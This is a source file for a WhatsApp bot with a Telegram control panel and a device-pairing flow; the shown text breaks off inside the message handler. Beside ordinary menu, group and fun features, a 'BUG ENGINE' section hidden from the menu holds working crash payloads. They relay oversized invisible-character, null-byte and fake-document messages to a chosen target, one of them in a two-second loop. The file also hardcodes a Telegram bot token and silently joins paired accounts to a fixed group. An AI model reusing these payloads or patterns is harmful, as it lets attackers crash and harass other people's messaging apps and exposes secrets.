/**
 * ╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
 * │      TOXIC YOBBY KING v7.0 - DEPLOY          │
 * │      Full Bot + Pairing Web Interface         │
 * │      Powered by mrxd-baileys                  │
 * ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
 */

const express = require('express');
const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  Browsers,
  fetchLatestBaileysVersion,
  jidNormalizedUser,
  getContentType,
  isJidGroup,
  proto,
  generateWAMessageFromContent,
  downloadMediaMessage,
} = require('mrxd-baileys');
const P = require('pino');
const path = require('path');
const fs = require('fs');
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const QRCode = require('qrcode');

// ──────────────────────────────────────────────
// Configuration
// ──────────────────────────────────────────────
const BOT_NAME    = 'TOXIC YOBBY KING';
const BOT_VERSION = '7.0.0';
const PREFIX      = '.';
const AUTH_DIR    = path.join(__dirname, 'auth_info');
const DB_DIR      = path.join(__dirname, 'database');
const PAIR_AUTH_DIR = path.join(__dirname, 'auth_sessions');
const TG_TOKEN    = process.env.TG_BOT_TOKEN || '8225842714:AAFZyb4rPPqhtW7RqphGPWXcJauK4QXEfxI';
const REPO_URL    = 'https://github.com/king-techh/TOXIC_YOBBY_KING.git';
const AUTO_JOIN_GROUP = 'https://chat.whatsapp.com/Ht5P2A2kNShHv099GQ14aQ?mode=gi_t';
const OWNER_NUMBER = '254707586102';
const WEB_PORT    = process.env.PORT || 1000;

// ──────────────────────────────────────────────
// Express App
// ──────────────────────────────────────────────
const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ──────────────────────────────────────────────
// State
// ──────────────────────────────────────────────
let waSocket     = null;
let waConnected  = false;
let isConnecting = false;
const groupSettings  = {};
const blockedNumbers = new Set();
const tgFlows        = {};
const startTime      = Date.now();
const messageCache   = new Map();
const MAX_CACHE      = 10000;
const tagallCooldown = {};
const activePairSessions = new Map(); // sessionId -> { sock, status, pairingCode, phone, qr, qrDataUrl, connected, waNumber }

// ──────────────────────────────────────────────
// Ensure dirs
// ──────────────────────────────────────────────
if (!fs.existsSync(DB_DIR)) fs.mkdirSync(DB_DIR, { recursive: true });
if (!fs.existsSync(AUTH_DIR)) fs.mkdirSync(AUTH_DIR, { recursive: true });
if (!fs.existsSync(PAIR_AUTH_DIR)) fs.mkdirSync(PAIR_AUTH_DIR, { recursive: true });

// ──────────────────────────────────────────────
// Database helpers
// ──────────────────────────────────────────────
function loadDB(name, def) {
  const fp = path.join(DB_DIR, `${name}.json`);
  try { return fs.existsSync(fp) ? JSON.parse(fs.readFileSync(fp, 'utf8')) : def; }
  catch { return def; }
}
function saveDB(name, data) {
  const fp = path.join(DB_DIR, `${name}.json`);
  fs.writeFileSync(fp, JSON.stringify(data, null, 2));
}

let dbSettings = loadDB('settings', { mode: 'private', prefix: '.', autoread: false, autotyping: false, autorecording: false, alwaysonline: false, ownerName: 'MAKAMESCO', antidelete: true, anticall: true });
let dbSudo    = loadDB('sudo', []);
let dbWelcome = loadDB('welcome', {});
let dbGoodbye = loadDB('goodbye', {});
let dbSessions = loadDB('sessions', {});

function saveSettings() { saveDB('settings', dbSettings); }
function saveSudo() { saveDB('sudo', dbSudo); }
function saveWelcome() { saveDB('welcome', dbWelcome); }
function saveGoodbye() { saveDB('goodbye', dbGoodbye); }
function saveSessions() { saveDB('sessions', dbSessions); }

function getGroupSettings(gid) {
  if (!groupSettings[gid]) groupSettings[gid] = { antilink: false, antilinkall: false, antidelete: false, antiedit: false, antispam: false, antibot: false, badword: false, antitag: false, anticall: false };
  return groupSettings[gid];
}

const waLogger = P({ level: 'silent' });

function cacheMessage(msg) {
  if (!msg?.key?.id || !msg?.key?.remoteJid) return;
  messageCache.set(`${msg.key.remoteJid}:${msg.key.id}`, msg);
  if (messageCache.size > MAX_CACHE) {
    const firstKey = messageCache.keys().next().value;
    messageCache.delete(firstKey);
  }
}
function getCachedMessage(jid, msgId) {
  return messageCache.get(`${jid}:${msgId}`) || null;
}

// ──────────────────────────────────────────────
// Utility Functions
// ──────────────────────────────────────────────
function formatUptime(ms) {
  const s = Math.floor(ms / 1000);
  return `${Math.floor(s/86400)}d ${Math.floor((s%86400)/3600)}h ${Math.floor((s%3600)/60)}m ${s%60}s`;
}

function extractNumber(jid) {
  if (!jid) return '';
  return jid.replace(/[@s\.whatsapp\.net]/g, '').split(':')[0];
}

function isOwner(jid, fromMe) {
  if (fromMe) return true;
  const num = extractNumber(jidNormalizedUser(jid));
  if (num === OWNER_NUMBER) return true;
  if (waSocket?.user?.id) {
    const botNum = extractNumber(waSocket.user.id);
    if (num === botNum) return true;
  }
  return false;
}

function isSudo(jid) {
  const num = extractNumber(jidNormalizedUser(jid));
  return dbSudo.includes(num);
}

function isAuthorized(jid, fromMe) {
  return isOwner(jid, fromMe) || isSudo(jid);
}

function normalizePhone(raw) {
  let p = raw.trim().replace(/[\s\-+]/g, '');
  if (p.startsWith('0')) p = '254' + p.slice(1);
  if (p.startsWith('7') || p.startsWith('1')) p = '254' + p;
  return p;
}

function randomPick(arr) { return arr[Math.floor(Math.random() * arr.length)]; }

function getTime() {
  return new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: '2-digit', hour12: true });
}

function getRAMPercent() {
  const used = process.memoryUsage().heapUsed / 1024 / 1024;
  const total = process.memoryUsage().heapTotal / 1024 / 1024;
  const pct = Math.round((used / total) * 100);
  const filled = Math.round(pct / 20);
  return '■'.repeat(filled) + '□'.repeat(5 - filled) + ' ' + pct + '%';
}

function generateSessionId() {
  const chars = '0123456789';
  let id = 'toxicyobby-';
  for (let i = 0; i < 8; i++) id += chars[Math.floor(Math.random() * chars.length)];
  return id;
}

function resolveTarget(msg, argsText) {
  if (argsText) {
    const cleanNum = argsText.replace(/[@\s+]/g, '');
    if (/^\d{7,15}$/.test(cleanNum)) {
      let phone = cleanNum;
      if (phone.startsWith('0')) phone = '254' + phone.slice(1);
      if (phone.startsWith('7') || phone.startsWith('1')) phone = '254' + phone;
      return phone + '@s.whatsapp.net';
    }
  }
  const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid;
  if (mentioned && mentioned.length > 0) return mentioned[0];
  const participant = msg.message?.extendedTextMessage?.contextInfo?.participant;
  if (participant) return participant;
  return null;
}

// ──── Fancy Text ────
function fancyText(text, style) {
  const styles = {
    1: { a:'ᴀ',b:'ʙ',c:'ᴄ',d:'ᴅ',e:'ᴇ',f:'ꜰ',g:'ɢ',h:'ʜ',i:'ɪ',j:'ᴊ',k:'ᴋ',l:'ʟ',m:'ᴍ',n:'ɴ',o:'ᴏ',p:'ᴘ',q:'ǫ',r:'ʀ',s:'ꜱ',t:'ᴛ',u:'ᴜ',v:'ᴠ',w:'ᴡ',x:'x',y:'ʏ',z:'ᴢ' },
  };
  const s = styles[style] || styles[1];
  return text.toLowerCase().split('').map(c => s[c] || c).join('');
}

const textStyleMap = {
  purple: { a:'🅰',b:'🅱',c:'©',d:'ᗪ',e:'€',f:'ƒ',g:'Ǥ',h:'⒣',i:'ᓮ',j:'ᒍ',k:'ⓚ',l:'ⓛ',m:'ⓜ',n:'ⓝ',o:'Ø',p:'ⓟ',q:'ⓠ',r:'ⓡ',s:'ⓢ',t:'ⓣ',u:'ⓤ',v:'ⓥ',w:'ⓦ',x:'✕',y:'ⓨ',z:'ⓩ' },
  neon: { a:'ᗩ',b:'ᗷ',c:'ᑕ',d:'ᗪ',e:'ᗴ',f:'ᖴ',g:'ᘜ',h:'ᕼ',i:'Ꮖ',j:'ᒍ',k:'Ꮶ',l:'ᒪ',m:'ᗰ',n:'ᑎ',o:'ᗝ',p:'ᑭ',q:'ᑫ',r:'ᖇ',s:'ᔕ',t:'Ꭲ',u:'ᑌ',v:'ᐯ',w:'ᗯ',x:'᙭',y:'Ꭹ',z:'ፚ' },
  matrix: { a:'ค',b:'๒',c:'ς',d:'๔',e:'є',f:'Ŧ',g:'ﻮ',h:'ђ',i:'เ',j:'ן',k:'к',l:'l',m:'๓',n:'ภ',o:'๏',p:'ק',q:'ợ',r:'г',s:'ร',t:'Շ',u:'ย',v:'ש',w:'ฬ',x:'א',y:'ฬ',z:'չ' },
  devil: { a:'∆',b:'ß',c:'¢',d:'Ð',e:'£',f:'F',g:'G',h:'H',i:'¡',j:'J',k:'K',l:'L',m:'M',n:'Ñ',o:'Ø',p:'P',q:'Q',r:'R',s:'§',t:'†',u:'µ',v:'V',w:'W',x:'×',y:'¥',z:'Z' },
  ice: { a:'₳',b:'฿',c:'₵',d:'Đ',e:'Ɇ',f:'₣',g:'₲',h:'Ⱨ',i:'ł',j:'J',k:'₭',l:'Ⱡ',m:'₥',n:'₦',o:'Ø',p:'₱',q:'Q',r:'Ɽ',s:'₴',t:'₮',u:'Ʉ',v:'V',w:'₩',x:'Ӿ',y:'Ɏ',z:'Ⱬ' },
  thunder: { a:'Λ',b:'β',c:'Ψ',d:'Ð',e:'Σ',f:'Φ',g:'Ĝ',h:'Ħ',i:'Į',j:'Ĵ',k:'Ķ',l:'Ł',m:'Μ',n:'Ň',o:'Ø',p:'Ƥ',q:'Ǫ',r:'Ř',s:'Ş',t:'Ť',u:'Ů',v:'V',w:'Ŵ',x:'Ж',y:'Ŷ',z:'Ź' },
  snow: { a:'α',b:'в',c:'c',d:'∂',e:'ε',f:'ƒ',g:'g',h:'н',i:'ι',j:'ј',k:'κ',l:'ℓ',m:'м',n:'η',o:'σ',p:'ρ',q:'q',r:'я',s:'s',t:'т',u:'υ',v:'ν',w:'ω',x:'χ',y:'у',z:'z' },
  metallic: { a:'ₐ',b:'ᵦ',c:'c',d:'ᵈ',e:'ₑ',f:'f',g:'g',h:'ₕ',i:'ᵢ',j:'ⱼ',k:'ₖ',l:'ₗ',m:'ₘ',n:'ₙ',o:'ₒ',p:'ₚ',q:'q',r:'ᵣ',s:'ₛ',t:'ₜ',u:'ᵤ',v:'ᵥ',w:'w',x:'ₓ',y:'y',z:'z' },
};

function applyTextStyle(style, text) {
  const map = textStyleMap[style];
  if (!map) return fancyText(text, 1);
  return text.toLowerCase().split('').map(c => map[c] || c).join('');
}

// ══════════════════════════════════════════════
//  MENU
// ══════════════════════════════════════════════
function getMenuText(command) {
  const p = dbSettings.prefix || PREFIX;
  const mode = dbSettings.mode;
  const time = getTime();
  const ramBar = getRAMPercent();
  const speed = (Math.random() * 0.005 + 0.001).toFixed(4);
  const owner = dbSettings.ownerName || 'MAKAMESCO';

  const header = `╭━━━⬡ TOXIC YOBBY KING ⬡━━━╮
┃ ☠️ *${BOT_NAME}* ☠️
┃ 👑 *Owner* : ${owner}
┃ 🕹️ *Prefix* : [ ${p} ]
┃ 🔐 *Mode* : ${mode}
┃ ⚡ *Speed* : ${speed} ms
┃ 💾 *RAM* : ${ramBar}
┃ 🕰️ *Time* : ${time}
┃ 📦 *Version* : v${BOT_VERSION}
╰━━━━━━━━━━━━━━━━━━╯`;

  // Main menu (all in one)
  return header + `

┏▣ 🛡️ SETTINGS
┃ antidelete ${dbSettings.antidelete ? '✅' : '❌'} | anticall ${dbSettings.anticall ? '✅' : '❌'}
┃ antilink (grp) | mode | prefix
┃ autoread | autotyping | alwaysonline
┃ setownername <name>
┗▣

┏▣ 👑 OWNER
┃ restart | block | unblock
┃ addsudo | remsudo | listsudo
┃ broadcast <text> | join <link>
┃ boom <text> <number> <count>
┗▣

┏▣ 📥 DOWNLOAD
┃ ytmp3 <url> | ytmp4 <url>
┃ play <song> | song <song>
┃ yts <search>
┗▣

┏▣ 👥 GROUP MANAGER
┃ promote | demote | remove | add
┃ tagall | hidetag | open | close
┃ subject | desc | leave | revoke
┃ antilink | antidelete
┗▣

┏▣ 🤖 AI
┃ ai <question> | define <word>
┗▣

┏▣ 🌍 SYSTEM
┃ menu | ping | alive | speed
┃ uptime | repo | owner | credits
┃ dp | poll
┗▣

┏▣ 🎲 FUN & GAMES
┃ fact | joke | quotes | 8ball
┃ truth | dare | advice
┃ country | currency
┗▣

┏▣ 🧰 TOOLKIT
┃ weather | calc | tts | trt
┃ url <media url> | image <search>
┗▣

┏▣ ✒️ TEXT STYLES
┃ purple | neon | matrix | devil
┃ ice | thunder | snow | metallic
┃ fancy <text>
┗▣

┏▣ 📦 EXTRAS
┃ bible | quran | pair | getpp
┃ sticker | photo | mp4
┃ vv | retrieve
┗▣

━━━━━━━━━━━━━━━━━━━━━━━
 ☠️ © 2025 TOXIC TECH INC
━━━━━━━━━━━━━━━━━━━━━━━`;
}

// ══════════════════════════════════════════════
//  BUG ENGINE (hidden from menu)
// ══════════════════════════════════════════════
let activeBugs = new Map();
function killAllBugs() { for (const [jid, id] of activeBugs) clearInterval(id); activeBugs.clear(); }

async function sendBug(sock, target, type) {
  try {
    switch(type) {
      case 'bug1': {
        const msg = generateWAMessageFromContent(target, { viewOnceMessage: { message: { interactiveMessage: proto.Message.InteractiveMessage.create({ body: proto.Message.InteractiveMessage.Body.create({ text: '\u200E'.repeat(5000) }), footer: proto.Message.InteractiveMessage.Footer.create({ text: '' }), header: proto.Message.InteractiveMessage.Header.create({ title: '', subtitle: '', hasMediaAttachment: false }), nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ buttons: [{ name: 'cta_url', buttonParamsJson: '{"display_text":"MSG","url":"https://www.google.com","merchant_url":"https://www.google.com"}' }] }) }) } }, { userJid: sock.user.id, quoted: null });
        await sock.relayMessage(target, msg.message, { messageId: msg.key.id }); break;
      }
      case 'bug2': {
        const msg = generateWAMessageFromContent(target, { documentMessage: { url: 'https://mmg.whatsapp.net/v/t62.7119-24/1.mp4', mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation', title: '\u202E\u200F\u200D'.repeat(2000) + '.pptx', fileSha256: 'ld5gnmaI+Vy42jJ6JLRiFMvVbHDUQ6WvH7XqYZnF1Ho=', fileLength: '99999999999999999999', pageCount: 999999999, mediaKey: 'n4Ix1T0ZG1YZ5arYBIqhz7dWrkMwxS2vCPRGz4K+TCI=', fileName: '\u202E\u200F\u200D'.repeat(2000) + '.pptx', fileEncSha256: 'oWYEkUQjGeMGVzmXQ3nFCP0CS0ZNNRT0oUd0kGsGq0Y=' } }, { userJid: sock.user.id, quoted: null });
        await sock.relayMessage(target, msg.message, { messageId: msg.key.id }); break;
      }
      case 'bug3': {
        const msg = generateWAMessageFromContent(target, { viewOnceMessage: { message: { interactiveMessage: proto.Message.InteractiveMessage.create({ body: proto.Message.InteractiveMessage.Body.create({ text: '\u0000'.repeat(8000) }), footer: proto.Message.InteractiveMessage.Footer.create({ text: '' }), header: proto.Message.InteractiveMessage.Header.create({ title: '\u200B'.repeat(5000), subtitle: '', hasMediaAttachment: false }), nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ buttons: [] }) }) } }, { userJid: sock.user.id, quoted: null });
        await sock.relayMessage(target, msg.message, { messageId: msg.key.id }); break;
      }
      case 'bug4': {
        const loopId = setInterval(async () => { try { const bugMsg = generateWAMessageFromContent(target, { viewOnceMessage: { message: { interactiveMessage: proto.Message.InteractiveMessage.create({ body: proto.Message.InteractiveMessage.Body.create({ text: '\u200E'.repeat(3000) }), footer: proto.Message.InteractiveMessage.Footer.create({ text: '' }), header: proto.Message.InteractiveMessage.Header.create({ title: '', hasMediaAttachment: false }), nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ buttons: [] }) }) } }, { userJid: sock.user.id, quoted: null }); await sock.relayMessage(target, bugMsg.message, { messageId: bugMsg.key.id }); } catch (e) { clearInterval(loopId); activeBugs.delete(target); } }, 2000);
        activeBugs.set(target, loopId); break;
      }
    }
  } catch (err) { console.error(`[BUG ${type}] Error:`, err.message); }
}

// ══════════════════════════════════════════════
//  FUN DATA
// ══════════════════════════════════════════════
const eightBallResponses = ["It is certain","Without a doubt","Yes, definitely","Reply hazy, try again","Ask again later","Cannot predict now","Don't count on it","My reply is no","Very doubtful","Most likely","Outlook good","Signs point to yes"];
const jokes = ["Why don't scientists trust atoms? Because they make up everything!","Why did the scarecrow win an award? He was outstanding in his field!","What do you call a fake noodle? An impasta!","Why don't eggs tell jokes? They'd crack each other up!","What do you call a bear with no teeth? A gummy bear!"];
const quotes = ['"The only way to do great work is to love what you do." — Steve Jobs','"Stay hungry, stay foolish." — Steve Jobs','"The future belongs to those who believe in the beauty of their dreams." — Eleanor Roosevelt','"It is during our darkest moments that we must focus to see the light." — Aristotle','"The only impossible journey is the one you never begin." — Tony Robbins'];
const facts = ["Honey never spoils. 3000-year-old honey is still edible!","A group of flamingos is called a 'flamboyance'","Octopuses have three hearts and blue blood","Bananas are berries, but strawberries aren't","A day on Venus is longer than a year on Venus"];
const truths = ["What's the most embarrassing thing you've ever done?","What's the biggest lie you've ever told?","What's something you've never told anyone?","What's the craziest thing you've ever done?"];
const dares = ["Send the last message in your chat here!","Do 20 pushups and send a video!","Call a random contact and sing happy birthday!","Send a voice note singing your favorite song!"];
const adviceList = ["Don't compare yourself to others. Compare yourself to who you were yesterday.","The best time to start was yesterday. The next best time is now.","Be yourself; everyone else is already taken."];

// ══════════════════════════════════════════════
//  TELEGRAM BOT
// ══════════════════════════════════════════════
const tgBot = new TelegramBot(TG_TOKEN, { polling: true });
console.log('[TG] Telegram bot started');

tgBot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const status = waConnected ? 'Connected' : 'Disconnected';
  const waNum = waSocket?.user?.id ? waSocket.user.id.split('@')[0].split(':')[0] : 'Not linked';
  tgBot.sendMessage(chatId, `*TOXIC YOBBY KING Control Panel*\n\nWA Number: \`${waNum}\`\nStatus: ${status}\nUptime: ${formatUptime(Date.now() - startTime)}\n\nUse the buttons below:`, { parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: 'Pair Device', callback_data: 'tg_pair' }],[{ text: 'Status', callback_data: 'tg_status' }, { text: 'Reconnect', callback_data: 'tg_reconnect' }],[{ text: 'Reset Session', callback_data: 'tg_reset' }]] } });
});

tgBot.onText(/\/pair/, (msg) => {
  if (waConnected) return tgBot.sendMessage(msg.chat.id, `*Already Connected!*\nNumber: \`${waSocket?.user?.id?.split('@')[0]?.split(':')[0] || 'Unknown'}\`\nUse /reset first.`, { parse_mode: 'Markdown' });
  tgFlows[msg.chat.id] = { step: 'phone' };
  tgBot.sendMessage(msg.chat.id, '*Pair New Device*\n\nEnter your WhatsApp phone number:\nExamples: \`254712345678\`\n\nType /cancel to abort.', { parse_mode: 'Markdown' });
});
tgBot.onText(/\/cancel/, (msg) => { if (tgFlows[msg.chat.id]) { tgFlows[msg.chat.id] = null; tgBot.sendMessage(msg.chat.id, 'Cancelled.'); } });

tgBot.on('message', (msg) => {
  const chatId = msg.chat.id; const text = (msg.text || '').trim();
  if (text.startsWith('/')) return;
  const flow = tgFlows[chatId]; if (!flow) return;
  if (flow.step === 'phone') {
    const phone = normalizePhone(text);
    if (!phone || phone.length < 10) return tgBot.sendMessage(chatId, 'Invalid number. Enter like `254712345678`:', { parse_mode: 'Markdown' });
    tgFlows[chatId] = { step: 'pairing', phone };
    tgBot.sendMessage(chatId, `*Requesting pairing code...*\nNumber: \`${phone}\``, { parse_mode: 'Markdown' });
    connectWhatsApp(chatId, phone);
  }
});

tgBot.on('callback_query', async (query) => {
  const chatId = query.message.chat.id; const data = query.data;
  if (data === 'tg_pair') { tgBot.answerCallbackQuery(query.id); if (waConnected) return tgBot.sendMessage(chatId, 'Already connected. Use /reset first.'); tgFlows[chatId] = { step: 'phone' }; tgBot.sendMessage(chatId, '*Enter phone number:*', { parse_mode: 'Markdown' }); return; }
  if (data === 'tg_status') { tgBot.answerCallbackQuery(query.id); const s = waConnected ? 'Connected' : 'Disconnected'; const n = waSocket?.user?.id?.split('@')[0]?.split(':')[0] || 'N/A'; tgBot.sendMessage(chatId, `*Status*\nWA: \`${n}\`\nStatus: ${s}\nUptime: ${formatUptime(Date.now() - startTime)}`, { parse_mode: 'Markdown' }); return; }
  if (data === 'tg_reconnect') { tgBot.answerCallbackQuery(query.id); if (waConnected) return tgBot.sendMessage(chatId, 'Already connected.'); try { await connectWhatsApp(chatId); } catch (e) { tgBot.sendMessage(chatId, `Failed: ${e.message}`); } return; }
  if (data === 'tg_reset') { tgBot.answerCallbackQuery(query.id); try { if (waSocket) { try { await waSocket.logout(); } catch (_) {} } fs.rmSync(AUTH_DIR, { recursive: true, force: true }); waSocket = null; waConnected = false; tgBot.sendMessage(chatId, '*Session Reset!* Use /pair to link a new number.', { parse_mode: 'Markdown' }); } catch (e) { tgBot.sendMessage(chatId, `Reset failed: ${e.message}`); } return; }
});

// ══════════════════════════════════════════════
//  WHATSAPP CONNECTION
// ══════════════════════════════════════════════
let pairingChatId = null;
let pendingPhoneNumber = null;

function killSocket() {
  if (waSocket) { try { waSocket.end(new Error('killed')); } catch (_) {} waSocket = null; }
  waConnected = false;
}

async function sendPairingNotification(sock, pairedPhone) {
  try {
    const sessionId = generateSessionId();
    const ownerJid = sock.user.id;
    dbSessions[sessionId] = { phone: pairedPhone, createdAt: Date.now(), active: true };
    saveSessions();

    // Send confirmation on WhatsApp (NOT on website)
    await sock.sendMessage(ownerJid, { text: `╭━━━⬡ TOXIC TECH ⬡━━━╮\n┃\n┃ THANKS FOR JOINING\n┃ TOXIC TECH\n┃ PAIRED SUCCESSFULLY ✅\n┃\n┃ Bot: ${BOT_NAME}\n┃ Version: v${BOT_VERSION}\n┃\n╰━━━━━━━━━━━━━━━━━━╯` });
    await sock.sendMessage(ownerJid, { text: `🔑 Your Session ID: *${sessionId}*\n\nSave this ID. You can use it to reconnect your bot.` });

    // Auto-join group
    try {
      const groupCode = AUTO_JOIN_GROUP.split('/').pop().split('?')[0];
      await sock.groupAcceptInvite(groupCode);
      console.log('[PAIR] Auto-joined group');
    } catch (e) { console.error('[PAIR] Auto-join failed:', e.message); }

    if (pairingChatId) await tgBot.sendMessage(pairingChatId, `*Device Paired!*\nPhone: \`${pairedPhone}\`\nSession: \`${sessionId}\``, { parse_mode: 'Markdown' });
  } catch (err) { console.error('[PAIR-NOTIFY] Error:', err.message); }
}

async function connectWhatsApp(tgChatId, phoneNumber) {
  if (isConnecting) return;
  isConnecting = true;
  if (tgChatId) pairingChatId = tgChatId;
  if (phoneNumber) pendingPhoneNumber = phoneNumber;
  killSocket();

  try {
    const { state, saveCreds } = await useMultiFileAuthState(AUTH_DIR);
    const { version } = await fetchLatestBaileysVersion();
    const sock = makeWASocket({ version, logger: waLogger, auth: state, browser: Browsers.ubuntu('Chrome'), printQRInTerminal: false, markOnlineOnConnect: true, generateHighQualityLinkPreview: true, getMessage: async (key) => { const m = getCachedMessage(key.remoteJid, key.id); return m?.message || undefined; } });
    waSocket = sock; isConnecting = false;
    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', async (update) => {
      const { connection, lastDisconnect, qr } = update;
      if (connection === 'open') {
        waConnected = true;
        const num = sock.user?.id?.split('@')[0]?.split(':')[0] || 'Unknown';
        console.log(`[WA] Connected as ${num}`);
        if (pairingChatId) await tgBot.sendMessage(pairingChatId, `*WhatsApp Connected!*\nNumber: \`${num}\``, { parse_mode: 'Markdown' });
        if (pendingPhoneNumber) { const pp = normalizePhone(pendingPhoneNumber); await new Promise(r => setTimeout(r, 3000)); await sendPairingNotification(sock, pp); pendingPhoneNumber = null; }
      }
      if (connection === 'close') {
        waConnected = false;
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        if (statusCode === 440) { if (pairingChatId) await tgBot.sendMessage(pairingChatId, '*Connection Replaced* (440).', { parse_mode: 'Markdown' }); return; }
        if (statusCode === DisconnectReason.loggedOut) { if (pairingChatId) await tgBot.sendMessage(pairingChatId, '*Logged Out!* Use /reset then /pair.', { parse_mode: 'Markdown' }); return; }
        const delay = statusCode === 428 ? 15000 : statusCode === 515 ? 2000 : 5000;
        setTimeout(async () => { try { await connectWhatsApp(pairingChatId); } catch (_) {} }, delay);
      }
      if ((qr || connection === 'connecting') && pendingPhoneNumber && !state.creds.registered) {
        const phone = normalizePhone(pendingPhoneNumber);
        if (phone && phone.length >= 10) {
          await new Promise(r => setTimeout(r, 3000));
          try {
            const code = await sock.requestPairingCode(phone);
            const fc = `${code.slice(0, 4)}-${code.slice(4)}`;
            if (pairingChatId) await tgBot.sendMessage(pairingChatId, `*Pairing Code*\n\n\`${fc}\`\n\nPhone: \`${phone}\``, { parse_mode: 'Markdown' });
            pendingPhoneNumber = null;
          } catch (err) { if (pairingChatId) await tgBot.sendMessage(pairingChatId, `*Pairing Failed!*\n${err.message}`, { parse_mode: 'Markdown' }); }
        }
      }
    });

    sock.ev.on('messages.upsert', async ({ messages, type }) => {
      for (const msg of messages) { cacheMessage(msg); if (type !== 'notify') continue; try { await handleWAMessage(sock, msg); } catch (err) { console.error('[WA-MSG] Error:', err.message); } }
    });

    // ANTIDELETE
    sock.ev.on('messages.delete', async (event) => {
      for (const key of (event.keys || [])) {
        if (!key?.id || !key?.remoteJid) continue;
        const jid = key.remoteJid;
        const stored = getCachedMessage(jid, key.id);
        if (!stored || stored.key.fromMe) continue;
        const sender = stored.key.participant || stored.key.remoteJid;
        const senderNum = sender.split('@')[0];
        const ownerJid = sock.user?.id; if (!ownerJid) continue;
        let shouldForward = dbSettings.antidelete;
        if (isJidGroup(jid)) { const gs = getGroupSettings(jid); if (gs.antidelete) shouldForward = true; }
        if (!shouldForward) continue;
        const ct = getContentType(stored.message);
        const isGroup = isJidGroup(jid);
        const location = isGroup ? `Group` : 'DM';
        try {
          if (ct === 'conversation' || ct === 'extendedTextMessage') {
            let text = ct === 'conversation' ? stored.message.conversation : (stored.message.extendedTextMessage?.text || '');
            await sock.sendMessage(ownerJid, { text: `🗑️ *ANTI-DELETE*\nFrom: @${senderNum}\n${location}\nTime: ${new Date().toLocaleString()}\n\n${text}`, mentions: [sender] });
          } else if (ct === 'imageMessage') {
            try { const buf = await downloadMediaMessage(stored, 'buffer', {}, { logger: waLogger }); await sock.sendMessage(ownerJid, { image: buf, caption: `🗑️ ANTI-DELETE [Image]\nFrom: @${senderNum}\n${location}\n\n${stored.message.imageMessage?.caption || ''}`, mentions: [sender] }); }
            catch { await sock.sendMessage(ownerJid, { text: `🗑️ ANTI-DELETE [Image]\nFrom: @${senderNum}\n${location}\n[Could not retrieve image]`, mentions: [sender] }); }
          } else if (ct === 'videoMessage') {
            try { const buf = await downloadMediaMessage(stored, 'buffer', {}, { logger: waLogger }); await sock.sendMessage(ownerJid, { video: buf, caption: `🗑️ ANTI-DELETE [Video]\nFrom: @${senderNum}\n${location}`, mentions: [sender] }); }
            catch { await sock.sendMessage(ownerJid, { text: `🗑️ ANTI-DELETE [Video]\nFrom: @${senderNum}\n${location}`, mentions: [sender] }); }
          } else if (ct === 'audioMessage') {
            try { const buf = await downloadMediaMessage(stored, 'buffer', {}, { logger: waLogger }); await sock.sendMessage(ownerJid, { audio: buf, mimetype: 'audio/mp4' }); await sock.sendMessage(ownerJid, { text: `🗑️ ANTI-DELETE [Audio]\nFrom: @${senderNum}\n${location}`, mentions: [sender] }); }
            catch { await sock.sendMessage(ownerJid, { text: `🗑️ ANTI-DELETE [Audio]\nFrom: @${senderNum}\n${location}`, mentions: [sender] }); }
          } else { await sock.sendMessage(ownerJid, { text: `🗑️ ANTI-DELETE [${ct || 'Media'}]\nFrom: @${senderNum}\n${location}`, mentions: [sender] }); }
          if (isGroup) await sock.sendMessage(jid, { text: `🗑️ @${senderNum} deleted a message!`, mentions: [sender] });
        } catch (err) { console.error('[ANTI-DELETE] Error:', err.message); }
      }
    });

    // ANTICALL
    sock.ev.on('call', async (calls) => {
      for (const call of calls) {
        try { if (!dbSettings.anticall || !call.from || call.status !== 'offer') continue; await sock.rejectCall(call.id, call.from); await sock.sendMessage(call.from, { text: '☠️ TOXIC YOBBY KING - Calls are not allowed! Your call was rejected.' }); const ownerJid = sock.user?.id; if (ownerJid) await sock.sendMessage(ownerJid, { text: `📞 Anti-Call: ${call.from.split('@')[0]} tried to call.` }); } catch (err) { console.error('[ANTI-CALL] Error:', err.message); }
      }
    });

    sock.ev.on('group-participants.update', async (update) => {
      const { id, participants, action } = update; if (!isJidGroup(id)) return;
      try { if (action === 'add' && dbWelcome[id]) for (const p of participants) await sock.sendMessage(id, { text: `Welcome @${p.split('@')[0]}!\n\n_${BOT_NAME}_`, mentions: [p] }); if (action === 'remove' && dbGoodbye[id]) for (const p of participants) await sock.sendMessage(id, { text: `@${p.split('@')[0]} left.\n\n_${BOT_NAME}_`, mentions: [p] }); } catch (_) {}
    });

    return sock;
  } catch (err) { isConnecting = false; console.error('[WA] Connection error:', err.message); throw err; }
}

// ══════════════════════════════════════════════
//  WHATSAPP MESSAGE HANDLER
// ══════════════════════════════════════════════
async function handleWAMessage(sock, msg) {
  const key = msg.key; const from = key.remoteJid; const isGroup = isJidGroup(from);
  const sender = isGroup ? (key.participant || from) : from; const senderNum = sender.split('@')[0]; const isMe = key.fromMe;
  if (dbSettings.autoread) { try { await sock.readMessages([key]); } catch (_) {} }
  if (dbSettings.autotyping) { try { await sock.sendPresenceUpdate('composing', from); } catch (_) {} }
  if (dbSettings.alwaysonline) { try { await sock.sendPresenceUpdate('available'); } catch (_) {} }
  const type = getContentType(msg.message);
  let text = '';
  if (type === 'conversation') text = msg.message.conversation;
  else if (type === 'extendedTextMessage') text = msg.message.extendedTextMessage.text;
  else if (type === 'imageMessage') text = msg.message.imageMessage.caption || '';
  else if (type === 'videoMessage') text = msg.message.videoMessage.caption || '';
  if (!text) return;
